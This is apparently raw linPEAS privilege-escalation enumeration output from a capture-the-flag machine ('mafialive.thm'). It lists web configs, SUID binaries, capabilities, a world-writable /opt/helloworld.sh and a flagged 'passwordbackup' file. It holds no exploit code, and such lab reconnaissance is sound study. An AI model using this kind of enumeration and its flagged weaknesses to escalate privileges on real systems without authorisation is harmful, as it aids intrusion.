lrwxrwxrwx 1 root root 35 Nov 16  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf                                                               
<VirtualHost *:80>   
  ServerAdmin admin@htb
     DocumentRoot /var/www/html/mafialive
     ServerName localhost
     <Directory /var/www/html/mafialive>
        Options +FollowSymlinks
        AllowOverride All
        Require all granted
     </Directory>
     ErrorLog ${APACHE_LOG_DIR}/error.log
     CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<VirtualHost *:80>
  ServerAdmin admin@htb
     DocumentRoot /var/www/html/development_testing
     ServerName mafialive.thm
     <Directory /var/www/html/development_testing>
        Options +FollowSymlinks
        AllowOverride All
        Require all granted
     </Directory>
     ErrorLog ${APACHE_LOG_DIR}/error.log
     CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 765 Nov 17  2020 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>   
  ServerAdmin admin@htb
     DocumentRoot /var/www/html/mafialive
     ServerName localhost
     <Directory /var/www/html/mafialive>
        Options +FollowSymlinks
        AllowOverride All
        Require all granted
     </Directory>
     ErrorLog ${APACHE_LOG_DIR}/error.log
     CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<VirtualHost *:80>
  ServerAdmin admin@htb
     DocumentRoot /var/www/html/development_testing
     ServerName mafialive.thm
     <Directory /var/www/html/development_testing>
        Options +FollowSymlinks
        AllowOverride All
        Require all granted
     </Directory>
     ErrorLog ${APACHE_LOG_DIR}/error.log
     CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Nov 16  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>   
  ServerAdmin admin@htb
     DocumentRoot /var/www/html/mafialive
     ServerName localhost
     <Directory /var/www/html/mafialive>
        Options +FollowSymlinks
        AllowOverride All
        Require all granted
     </Directory>
     ErrorLog ${APACHE_LOG_DIR}/error.log
     CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<VirtualHost *:80>
  ServerAdmin admin@htb
     DocumentRoot /var/www/html/development_testing
     ServerName mafialive.thm
     <Directory /var/www/html/development_testing>
        Options +FollowSymlinks
        AllowOverride All
        Require all granted
     </Directory>
     ErrorLog ${APACHE_LOG_DIR}/error.log
     CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 71817 Oct  7  2020 /etc/php/7.2/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 71429 Oct  7  2020 /etc/php/7.2/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On



╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Feb 14  2020 /usr/share/doc/rsync/examples/rsyncd.conf          
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Nov 16  2020 /etc/pam.d                                         
-rw-r--r-- 1 root root 2133 Mar  4  2019 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                        
drwxr-xr-x 2 root root 4096 Oct 22 15:55 /etc/ldap


╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Nov 16  2020 /usr/share/keyrings                                




╔══════════╣ Analyzing FTP Files (limit 70)
                                                                                            


-rw-r--r-- 1 root root 69 Oct  7  2020 /etc/php/7.2/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Oct  7  2020 /usr/share/php7.2-common/common/ftp.ini






╔══════════╣ Analyzing DNS Files (limit 70)
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind         
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind




╔══════════╣ Analyzing Interesting logs Files (limit 70)
-rwxrwxr-x 1 root adm 203 Oct 22 15:54 /var/log/apache2/access.log                          

-rwxrwxr-x 1 root root 583 Oct 22 15:53 /var/log/apache2/error.log

╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Apr  5  2018 /etc/skel/.bashrc                                  
-rw-r--r-- 1 archangel archangel 3771 Nov 18  2020 /home/archangel/.bashrc





-rw-r--r-- 1 root root 807 Apr  5  2018 /etc/skel/.profile
-rw-r--r-- 1 archangel archangel 807 Nov 18  2020 /home/archangel/.profile





╔══════════╣ Searching mysql credentials and exec
                                                                                            
MySQL process not found.
╔══════════╣ Analyzing PGP-GPG Files (limit 70)
gpg Not Found                                                                               
netpgpkeys Not Found                                                                        
netpgp Not Found                                                                            
                                                                                            
-rw-r--r-- 1 root root 2796 Sep 18  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg                                                                                         
-rw-r--r-- 1 root root 2794 Sep 18  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg                                                                                         
-rw-r--r-- 1 root root 1733 Sep 18  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg                                                                                         
-rw-r--r-- 1 root root 7399 Sep 18  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 2253 Mar 21  2018 /usr/share/keyrings/ubuntu-esm-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-updates-keyring.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 22  2018 /usr/share/popularity-contest/debian-popcon.gpg



╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                              
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                 
                                                                                            




-rw-r--r-- 1 root root 173 Nov 16  2020 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 93 Nov 16  2020 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 393 Nov 16  2020 /etc/ssh/ssh_host_rsa_key.pub

ChallengeResponseAuthentication no
UsePAM yes
══╣ Some certificates were found (out limited):
/etc/ssl/certs/ACCVRAIZ1.pem                                                                
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/CA_Disig_Root_R2.pem
/etc/ssl/certs/CFCA_EV_ROOT.pem
/etc/ssl/certs/COMODO_Certification_Authority.pem
/etc/ssl/certs/COMODO_ECC_Certification_Authority.pem
927PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                              
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                            


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes




                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════          
                      ╚════════════════════════════════════╝                                
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                         
-rwsr-xr-x 1 root root 40K Mar 23  2019 /usr/bin/newgrp  --->  HP-UX_10.20                  
-rwsr-xr-x 1 root root 75K Mar 23  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 75K Mar 23  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Mar 23  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 59K Mar 23  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                  
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 146K Sep 23  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                                                   
-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 27K Sep 17  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 44K Mar 23  2019 /bin/su
-rwsr-xr-x 1 root root 43K Sep 17  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                 
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                         
-rwxr-sr-x 1 root mlocate 43K Mar  1  2018 /usr/bin/mlocate                                 
-rwxr-sr-x 1 root shadow 71K Mar 23  2019 /usr/bin/chage
-rwxr-sr-x 1 root shadow 23K Mar 23  2019 /usr/bin/expiry
-rwxr-sr-x 1 root tty 31K Sep 17  2020 /usr/bin/wall
-rwxr-sr-x 1 root crontab 39K Nov 16  2017 /usr/bin/crontab
-rwxr-sr-x 1 root ssh 355K Mar  4  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 14K Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 34K Jul 22  2020 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34K Jul 22  2020 /sbin/unix_chkpwd

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls      
files with acls in searched folders Not Found                                               
                                                                                            
╔══════════╣ Capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities                                                                                          
══╣ Current shell capabilities                                                              
./linpeas.sh: 7794: ./linpeas.sh: [[: not found                                             
CapInh:  [Invalid capability format]
./linpeas.sh: 7794: ./linpeas.sh: [[: not found
CapPrm:  [Invalid capability format]
./linpeas.sh: 7785: ./linpeas.sh: [[: not found
CapEff:  [Invalid capability format]
./linpeas.sh: 7794: ./linpeas.sh: [[: not found
CapBnd:  [Invalid capability format]
./linpeas.sh: 7794: ./linpeas.sh: [[: not found
CapAmb:  [Invalid capability format]

╚ Parent process capabilities
./linpeas.sh: 7819: ./linpeas.sh: [[: not found                                             
CapInh:  [Invalid capability format]
./linpeas.sh: 7819: ./linpeas.sh: [[: not found
CapPrm:  [Invalid capability format]
./linpeas.sh: 7810: ./linpeas.sh: [[: not found
CapEff:  [Invalid capability format]
./linpeas.sh: 7819: ./linpeas.sh: [[: not found
CapBnd:  [Invalid capability format]
./linpeas.sh: 7819: ./linpeas.sh: [[: not found
CapAmb:  [Invalid capability format]


Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities                                                                                          
                                                                                            
╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso      
/etc/ld.so.conf                                                                             
Content of /etc/ld.so.conf:                                                                 
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf                                                               
  - /usr/local/lib                                                                          
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu                                                         
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Files (scripts) in /etc/profile.d/                                             
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files                                                                                        
total 20                                                                                    
drwxr-xr-x  2 root root 4096 Nov 16  2020 .
drwxr-xr-x 81 root root 4096 Oct 22 15:55 ..
-rw-r--r--  1 root root   96 Aug 14  2020 01-locale-fix.sh
-rw-r--r--  1 root root  664 Apr  2  2018 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd                                                                            
                                                                                            
╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root 3194 Mar 27  2018 sbin.dhclient                                      
-rw-r--r-- 1 root root 2857 Apr  7  2018 usr.bin.man
-rw-r--r-- 1 root root 1550 Apr 24  2018 usr.sbin.rsyslogd
-rw-r--r-- 1 root root 1353 Apr  1  2018 usr.sbin.tcpdump

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                
═╣ Credentials in fstab/mtab? ........... No                                                
═╣ Can I read shadow files? ............. No                                                
═╣ Can I read shadow plists? ............ No                                                
═╣ Can I write shadow plists? ........... No                                                
═╣ Can I read opasswd file? ............. No                                                
═╣ Can I write in network-scripts? ...... No                                                
═╣ Can I read root folder? .............. No                                                
                                                                                            
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                      
/home/archangel/myfiles/passwordbackup
/root/
/var/www
/var/www/html
/var/www/html/development_testing
/var/www/html/development_testing/robots.txt
/var/www/html/mafialive
/var/www/html/mafialive/images
/var/www/html/mafialive/images/index.html
/var/www/html/mafialive/images/demo
/var/www/html/mafialive/images/demo/100x100.png
/var/www/html/mafialive/images/demo/348x261.png
/var/www/html/mafialive/images/demo/backgrounds
/var/www/html/mafialive/images/demo/backgrounds/01.png
/var/www/html/mafialive/images/demo/backgrounds/index.html
/var/www/html/mafialive/images/demo/gallery
/var/www/html/mafialive/images/demo/gallery/01.png
/var/www/html/mafialive/images/demo/gallery/index.html
/var/www/html/mafialive/images/demo/348x420.png
/var/www/html/mafialive/images/demo/imgr.gif
/var/www/html/mafialive/images/demo/avatar.png
/var/www/html/mafialive/images/demo/imgl.gif
/var/www/html/mafialive/images/demo/index.html
/var/www/html/mafialive/layout
/var/www/html/mafialive/layout/styles
/var/www/html/mafialive/layout/styles/layout.css
/var/www/html/mafialive/layout/styles/fontawesome-free
/var/www/html/mafialive/layout/styles/fontawesome-free/webfonts
/var/www/html/mafialive/layout/styles/fontawesome-free/webfonts/fa-solid-900.woff2

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
                                                                                            
╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                            
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)                                                                                     
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                                        
/dev/mqueue                                                                                 
/dev/shm
/opt
/opt/helloworld.sh
/run/lock
/run/lock/apache2
/tmp
/tmp/linpeas.sh
/var/cache/apache2/mod_cache_disk
/var/lib/php/sessions
/var/tmp
/var/www/html/development_testing
/var/www/html/mafialive

╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                                        
                                                                                            


                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════         
                            ╚═════════════════════════╝                                     
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                                                                                
/usr/bin/gettext.sh                                                                         

╔══════════╣ Executable files potentially added by user (limit 70)
2020-11-20+10:35:14.0385159800 /opt/helloworld.sh                                           
2020-11-16+20:46:15.7529076030 /var/log/apache2/other_vhosts_access.log

╔══════════╣ Unexpected in /opt (usually empty)
total 16                                                                                    
drwxrwxrwx  3 root      root      4096 Nov 20  2020 .
drwxr-xr-x 22 root      root      4096 Nov 16  2020 ..
drwxrwx---  2 archangel archangel 4096 Nov 20  2020 backupfiles
-rwxrwxrwx  1 archangel archangel   66 Nov 20  2020 helloworld.sh

╔══════════╣ Unexpected in root
/initrd.img                                                                                 
/vmlinuz
/initrd.img.old
/swapfile
/vmlinuz.old

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/journal/5d3f7faccdd4422f81242de9a6072108/system.journal                            
/var/log/syslog
/var/log/auth.log

logrotate 3.11.0
╔══════════╣ Syslog configuration (limit 50)
                                                                                            


module(load="imuxsock") # provides support for local system logging



module(load="imklog" permitnonkernelfacility="on")


$ActionFileDefaultTemplate RSYSLOG_TraditionalFileFormat

$RepeatedMsgReduction on

$FileOwner syslog
$FileGroup adm
$FileCreateMode 0640
$DirCreateMode 0755
$Umask 0022
$PrivDropToUser syslog
$PrivDropToGroup syslog

$WorkDirectory /var/spool/rsyslog

$IncludeConfig /etc/rsyslog.d/*.conf
╔══════════╣ Auditd configuration (limit 50)
auditd configuration Not Found                                                              
╔══════════╣ Log files with potentially weak perms (limit 50)                               
   130696   1064 -rw-r-----   1 syslog   adm       1081692 Oct 22 15:53 /var/log/kern.log   
   137455      4 -rwxrwxr-x   1 root     adm           203 Oct 22 15:54 /var/log/apache2/access.log                                                                                     
   137456      0 -rwxrwxr-x   1 root     adm             0 Nov 16  2020 /var/log/apache2/other_vhosts_access.log                                                                        
   130695   1464 -rw-r-----   1 syslog   adm              1493763 Oct 22 16:05 /var/log/syslog                                                                                          
   130698    184 -rw-r-----   1 syslog   adm               181894 Oct 22 16:05 /var/log/auth.log                                                                                        
   131303    144 -rw-r-----   1 root     adm               140861 Oct 22 15:55 /var/log/apt/term.log                                                                                    

╔══════════╣ Files inside /home/www-data (limit 20)
                                                                                            
╔══════════╣ Files inside others home (limit 20)
/home/archangel/.selected_editor                                                            
/home/archangel/.profile
/home/archangel/user.txt
/home/archangel/myfiles/passwordbackup
/home/archangel/.bash_logout
/home/archangel/.bashrc
/var/www/html/development_testing/mrrobot.php
/var/www/html/development_testing/robots.txt
/var/www/html/development_testing/test.php
/var/www/html/development_testing/index.html
/var/www/html/mafialive/images/index.html
/var/www/html/mafialive/images/demo/100x100.png
/var/www/html/mafialive/images/demo/348x261.png
/var/www/html/mafialive/images/demo/backgrounds/01.png
/var/www/html/mafialive/images/demo/backgrounds/index.html
/var/www/html/mafialive/images/demo/gallery/01.png
/var/www/html/mafialive/images/demo/gallery/index.html
/var/www/html/mafialive/images/demo/348x420.png
/var/www/html/mafialive/images/demo/imgr.gif
/var/www/html/mafialive/images/demo/avatar.png

╔══════════╣ Searching installed mail applications
                                                                                            
╔══════════╣ Mails (limit 50)
                                                                                            
╔══════════╣ Backup folders
-rw-r--r-- 1 root root 44 Nov 18  2020 /home/archangel/myfiles/passwordbackup               
-rw-r--r-- 1 root root 44 Nov 18  2020 /home/archangel/myfiles/passwordbackup

drwxr-xr-x 2 root root 4096 Nov 19  2020 /var/backups
total 8
-rw-r--r-- 1 root root 4948 Nov 18  2020 apt.extended_states.0


╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 0 Oct 21  2020 /usr/src/linux-headers-4.15.0-123-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Oct 21  2020 /usr/src/linux-headers-4.15.0-123-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 217512 Oct 21  2020 /usr/src/linux-headers-4.15.0-123-generic/.config.old                                                                                        
-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 361345 Feb  2  2018 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 10454 Nov 16  2020 /usr/share/info/dir.old
-rw-r--r-- 1 root root 2543 Apr 13  2018 /usr/share/help-langpack/en_GB/evolution/backup-restore.page
-rw-r--r-- 1 root root 755 Mar 17  2018 /usr/share/help-langpack/en_GB/org.gnome.DejaDup/backup-first.page                                                                              
-rw-r--r-- 1 root root 974 Mar 17  2018 /usr/share/help-langpack/en_GB/org.gnome.DejaDup/backup-auto.page                                                                               
-rw-r--r-- 1 root root 755 Mar 17  2018 /usr/share/help-langpack/en_AU/org.gnome.DejaDup/backup-first.page                                                                              
-rw-r--r-- 1 root root 974 Mar 17  2018 /usr/share/help-langpack/en_AU/org.gnome.DejaDup/backup-auto.page                                                                               
-rw-r--r-- 1 root root 44 Nov 18  2020 /home/archangel/myfiles/passwordbackup
-rw-r--r-- 1 root root 7905 Oct 21  2020 /lib/modules/4.15.0-123-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 7857 Oct 21  2020 /lib/modules/4.15.0-123-generic/kernel/drivers/power/supply/wm831x_backup.ko

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/mlocate/mlocate.db: regular file, no read permission                         


╔══════════╣ Web files?(output limit)
/var/www/:                                                                                  
total 12K
drwxr-xr-x  3 root root 4.0K Nov 16  2020 .
drwxr-xr-x 12 root root 4.0K Nov 16  2020 ..
drwxr-xr-x  4 root root 4.0K Nov 17  2020 html

/var/www/html:
total 16K
drwxr-xr-x 4 root root 4.0K Nov 17  2020 .
drwxr-xr-x 3 root root 4.0K Nov 16  2020 ..

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)                                                                               
-rw-r--r-- 1 root root 1531 Nov 16  2020 /etc/apparmor.d/cache/.features                    
-rw-r--r-- 1 root root 220 Apr  5  2018 /etc/skel/.bash_logout
-rw------- 1 root root 0 Nov 16  2020 /etc/.pwd.lock
-rw-rw-r-- 1 archangel archangel 66 Nov 18  2020 /home/archangel/.selected_editor
-rw-r--r-- 1 archangel archangel 220 Nov 18  2020 /home/archangel/.bash_logout

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                                   
-rwxr-xr-x 1 www-data www-data 971926 Oct 18 04:56 /tmp/linpeas.sh                          
-rw-r--r-- 1 root root 44 Nov 18  2020 /home/archangel/myfiles/passwordbackup

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password                                                                   
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/home/archangel/myfiles/passwordbackup
/usr/lib/grub/i386-pc/legacy_password_test.mod
/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/share/help-langpack/en_GB/empathy/irc-nick-password.page
/usr/share/help-langpack/en_GB/evince/password.page
/usr/share/help-langpack/en_GB/zenity/password.page
/usr/share/john/password.lst
/usr/share/man/man1/systemd-ask-password.1.gz
/usr/share/man/man1/systemd-tty-ask-password-agent.1.gz
/usr/share/man/man7/credentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/usr/share/ubuntu-advantage-tools/modules/credentials.sh
/var/cache/debconf/passwords.dat
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                            
╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                            
╔══════════╣ Searching passwords inside logs (limit 70)
/var/log/dpkg.log:2020-11-16 09:33:26 install base-passwd:amd64 <none> 3.5.44               
/var/log/dpkg.log:2020-11-16 09:33:26 status half-installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-11-16 09:33:27 configure base-passwd:amd64 3.5.44 3.5.44
/var/log/dpkg.log:2020-11-16 09:33:27 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-11-16 09:33:27 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-11-16 09:33:28 status installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-11-16 09:35:52 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-11-16 09:35:52 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-11-16 09:35:52 upgrade base-passwd:amd64 3.5.44 3.5.44
/var/log/dpkg.log:2020-11-16 09:35:53 status half-installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-11-16 09:35:54 status half-installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-11-16 09:35:55 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-11-16 09:35:56 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-11-16 09:41:08 install passwd:amd64 <none> 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-11-16 09:41:08 status half-installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-11-16 09:41:34 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-11-16 09:43:52 configure base-passwd:amd64 3.5.44 <none>
/var/log/dpkg.log:2020-11-16 09:43:52 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-11-16 09:43:52 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-11-16 09:43:53 status installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-11-16 09:45:11 configure passwd:amd64 1:4.5-1ubuntu1 <none>
/var/log/dpkg.log:2020-11-16 09:45:11 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-11-16 09:45:12 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-11-16 09:45:13 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-11-16 09:45:14 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-11-16 09:45:15 status half-configured passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-11-16 09:45:16 status installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-11-16 15:51:27 status half-configured passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-11-16 15:51:27 upgrade passwd:amd64 1:4.5-1ubuntu1 1:4.5-1ubuntu2
/var/log/dpkg.log:2020-11-16 15:51:28 status half-installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-11-16 15:51:28 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-11-16 15:51:29 status half-installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-11-16 15:51:30 status unpacked passwd:amd64 1:4.5-1ubuntu2
/var/log/dpkg.log:2020-11-16 15:51:31 configure passwd:amd64 1:4.5-1ubuntu2 <none>
/var/log/dpkg.log:2020-11-16 15:51:31 status unpacked passwd:amd64 1:4.5-1ubuntu2
/var/log/dpkg.log:2020-11-16 15:51:32 status unpacked passwd:amd64 1:4.5-1ubuntu2
/var/log/dpkg.log:2020-11-16 15:51:33 status unpacked passwd:amd64 1:4.5-1ubuntu2
/var/log/dpkg.log:2020-11-16 15:51:34 status half-configured passwd:amd64 1:4.5-1ubuntu2
